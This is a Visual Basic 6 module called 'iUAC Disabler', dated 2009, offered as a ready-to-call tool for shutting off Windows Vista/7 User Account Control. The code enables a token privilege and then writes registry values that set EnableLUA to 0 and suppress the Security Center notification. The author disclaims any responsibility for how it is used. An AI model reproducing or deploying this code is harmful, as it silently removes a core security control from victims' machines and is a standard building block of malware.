Attribute VB_Name = "Module4"
'***************************************************************************************'
' Project : iUAC Disabler                                                               '
' Usage   : Call Fuck_UAC                                                               '
' Copyright (c) 2009 by Skyweb07 <skyweb09@hotmail.es>                                  '
'                                                                                       '
'***************************************************************************************'
' This software is used shoutdown Vista / Win7 UAC Security                             '
' The author is not responsible for the use you get to the tool;)                       '
'***************************************************************************************'

' <== REG APIS ==>

Private Const KEY_CREATE_LINK = &H20&
Private Const READ_CONTROL = &H20000
Private Const WRITE_DAC = &H40000
Private Const WRITE_OWNER = &H80000
Private Const SYNCHRONIZE = &H100000

Private Const STANDARD_RIGHTS_REQUIRED = &HF0000
Private Const STANDARD_RIGHTS_READ = READ_CONTROL
Private Const STANDARD_RIGHTS_WRITE = READ_CONTROL
Private Const STANDARD_RIGHTS_EXECUTE = READ_CONTROL
Private Const STANDARD_RIGHTS_ALL = &H1F0000

Private Const KEY_WRITE = STANDARD_RIGHTS_WRITE Or &H2& Or &H4&
Private Const KEY_ALL_ACCESS = ((STANDARD_RIGHTS_ALL Or &H1& Or &H2& Or &H4& Or &H8& Or &H10& Or KEY_CREATE_LINK) And (Not SYNCHRONIZE))

Public Enum hKeys
HKEY_CURRENT_USER = &H80000001
HKEY_LOCAL_MACHINE = &H80000002
End Enum

Private Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByRef lpData As Long, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long

'********************************************************************************************************************************************************************************************************************************************

' <== APIS for Elevate Privileges ==>

Private Declare Function AdjustTokenPrivileges Lib "advapi32.dll" (ByVal TokenHandle As Long, ByVal DisableAllPriv As Long, NewState As TOKEN_PRIVILEGES, ByVal BufferLength As Long, PreviousState As TOKEN_PRIVILEGES, ReturnLength As Long) As Long
Private Declare Function LookupPrivilegeValue Lib "advapi32.dll" Alias "LookupPrivilegeValueA" (ByVal lpSystemName As Any, ByVal lpName As String, lpLuid As LUID) As Long
Private Declare Function OpenProcessToken Lib "advapi32.dll" (ByVal ProcessHandle As Long, ByVal DesiredAccess As Long, TokenHandle As Long) As Long
Private Declare Function GetCurrentProcess Lib "kernel32" () As Long

Private Type LUID
lowpart As Long
highpart As Long
End Type

Private Type LUID_AND_ATTRIBUTES
pLuid As LUID
Attributes As Long
End Type

Private Type TOKEN_PRIVILEGES
PrivilegeCount As Long
Privileges As LUID_AND_ATTRIBUTES
End Type
 
Function Fuck_UAC()

If Enable_Privileges("SeBackupPrivilege") = True Then ' // If we get Privileges for Modify Registry

Call Write_KEY(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Security Center", "UACDisableNotify", "0") ' Disable UAC Promp Message
Call Write_KEY(HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "0") ' Disable UAC

End If
End Function

Function Enable_Privileges(sName As String) As Boolean ' // Function For Elevate User Privileges and modify Registry

'http://msdn.microsoft.com/en-us/library/aa375202%28VS.85%29.aspx
'http://www.solotuweb.com/fs~id~8279.html

Dim lRet As Long, lToken As Long, sLen As Long, sUID As LUID, Priv_Token As TOKEN_PRIVILEGES, Prev_Token As TOKEN_PRIVILEGES

lRet = OpenProcessToken(GetCurrentProcess(), &H20 Or &H8&, lToken)
If lRet = 0 Then Exit Function
 
lRet = LookupPrivilegeValue(0&, sName, sUID)
If lRet = 0 Then Exit Function
 
With Priv_Token
                        .PrivilegeCount = 1
                        .Privileges.Attributes = &H2
                        .Privileges.pLuid = sUID
End With
   
Enable_Privileges = (AdjustTokenPrivileges(lToken, False, Priv_Token, Len(Prev_Token), Prev_Token, sLen) <> 0)
End Function

Function Write_KEY(hKey As hKeys, hSubKey As String, sNombre As String, sValue As Long) ' // Function for Set Registry Value

If RegOpenKeyEx(hKey, hSubKey, 0&, KEY_WRITE, MainKey) = 0& Then
If (RegSetValueExA(MainKey, sNombre, 0, 4, sValue, 4) = 0&) Then
RegCloseKey MainKey
End If
End If

End Function



